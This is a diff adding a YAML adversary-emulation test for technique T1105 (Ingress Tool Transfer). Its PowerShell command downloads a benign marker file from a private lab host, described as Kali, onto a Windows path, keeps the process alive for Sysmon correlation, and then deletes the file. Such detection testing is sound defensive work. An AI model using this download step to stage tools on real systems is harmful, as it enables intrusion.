@@ -1,0 +1,26 @@
+attack_technique: T1105
+display_name: 'Ingress Tool Transfer - DATN lab extension'
+atomic_tests:
+  - name: 'DATN lab HTTP download with process retained for Sysmon correlation'
+    auto_generated_guid: 1a4cb27d-4834-4c6a-86e0-01f8b0f6cbe7
+    description: |
+      Downloads a benign lab marker from Kali and keeps the process alive briefly.
+      This is a DATN-specific Atomic extension, not an upstream Red Canary test.
+    supported_platforms:
+      - windows
+    input_arguments:
+      remote_file:
+        description: Isolated lab HTTP marker
+        type: url
+        default: http://192.168.10.102:8088/t1105-lab-sample.txt
+      destination_path:
+        description: Lab-only destination
+        type: path
+        default: 'C:\DATN-T1105\incoming\t1105-lab-sample.txt'
+    executor:
+      name: powershell
+      command: |
+        (New-Object System.Net.WebClient).DownloadFile("#{remote_file}", "#{destination_path}")
+        Start-Sleep -Seconds 12
+      cleanup_command: |
+        Remove-Item -LiteralPath "#{destination_path}" -Force -ErrorAction Ignore
